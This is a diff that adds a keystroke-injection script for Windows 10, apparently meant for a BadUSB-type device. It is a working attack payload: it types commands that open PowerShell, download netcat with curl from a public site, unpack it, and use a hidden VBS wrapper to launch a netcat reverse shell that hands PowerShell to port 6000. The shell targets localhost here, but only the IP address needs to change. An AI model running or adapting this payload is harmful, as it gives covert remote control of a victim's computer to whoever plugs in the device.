@@ -1,0 +1,23 @@
+# This script perform a local reverse shelling on Windows operating system.
+# Tested on: Windows 10 21H2
+# OS build:  19044.2604
+# Recommended configurations:
+#   CFG_TUD_MSC 0
+#   DEBUG_CAPS_LOCK 0
+
+# Open PowerShell
+<m-r><DELAY 500>powershell<\enter><DELAY 500>
+
+# Download nc (optional if nc is not present)
+curl.exe -o .\Downloads\nc.zip --ssl-no-revoke https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip<\enter><DELAY 2000>
+
+# Unpack nc
+tar -xf .\Downloads\nc.zip -C .\Downloads<\enter><DELAY 200>
+
+# perform reverse shelling via port 6000
+# create a VBS script that will allow the command to run in the background
+echo 'CreateObject("Wscript.Shell").Run "" & WScript.Arguments(0) & "", 0, False' > hidden.vbs<\enter>
+.\hidden.vbs ".\Downloads\netcat-1.11\nc64.exe 127.0.0.1 6000 -e powershell.exe"; exit<\enter>
+
+# links to the hidden script
+# https://superuser.com/questions/62525/run-a-batch-file-in-a-completely-hidden-way
